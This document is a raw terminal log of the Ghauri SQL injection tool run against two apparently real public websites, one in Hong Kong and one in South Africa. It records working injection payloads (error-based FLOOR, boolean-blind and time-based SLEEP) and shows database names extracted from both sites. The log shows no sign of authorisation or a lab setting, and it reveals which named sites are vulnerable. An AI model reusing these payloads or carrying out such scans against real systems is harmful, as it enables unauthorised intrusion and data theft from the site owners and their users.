+[05:26:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[05:26:50] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[05:26:54] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[05:27:00] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[05:27:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[05:27:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[05:27:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[05:27:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:27:13] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[05:27:15] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)' injectable
+[05:27:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:27:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[05:27:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[05:27:24] [INFO] testing 'Boolean-based blind - Parameter replace'
+[05:27:24] [WARNING] HTTP error code detected during run:
+403 (Forbidden) - 3 time(s). Do you want to keep testing the others (if any) [y/N]? n
+
+[05:27:34] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[05:27:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[05:27:34] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[05:27:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[05:27:35] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[05:27:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[05:27:36] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 138 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=' OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))-- wXyW
+---
+[05:27:41] [INFO] testing MySQL
+[05:27:41] [INFO] confirming MySQL
+[05:27:41] [INFO] the back-end DBMS is MySQL
+[05:27:41] [INFO] fetching database names
+[05:27:41] [INFO] fetching number of databases
+[05:27:41] [WARNING] the SQL query provided does not return any output
+[05:27:41] [ERROR] unable to retrieve the number of databases
+[05:27:41] [INFO] fetching current database
+[05:27:43] [INFO] retrieved: 'supreme'
+current database: 'supreme'
+
+[05:27:43] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.suprememed.com.hk'
+
+[*] ending @ 05:27:43 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.plettartsfestival.co.za/article.php?id=135" --dbs                               
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 05:54:15 /2025-11-29/
+
+[05:54:15] [INFO] testing connection to the target URL
+[05:54:17] [INFO] testing if the target URL content is stable
+[05:54:19] [INFO] target URL content is stable
+[05:54:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[05:54:20] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[05:54:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[05:54:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[05:55:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[05:55:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[05:55:33] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[05:55:47] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[05:55:59] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[05:56:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[05:56:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[05:56:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[05:56:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:56:54] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[05:56:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:56:58] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[05:56:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[05:56:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[05:57:09] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[05:57:33] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=135 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW
+
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=135 AND 09895=9895-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(7),0)
+---
+[05:57:37] [INFO] testing MySQL
+[05:57:37] [INFO] confirming MySQL
+[05:57:37] [INFO] the back-end DBMS is MySQL
+[05:57:37] [INFO] fetching database names
+[05:57:37] [INFO] fetching number of databases
+[05:57:38] [INFO] retrieved: 2
+[05:57:40] [INFO] retrieved: information_schema
+[05:57:41] [INFO] retrieved: apperptwen_db1
+available databases [2]:
+[*] apperptwen_db1
+[*] information_schema
+
+[05:57:41] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.plettartsfestival.co.za'
+
+[*] ending @ 05:57:41 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
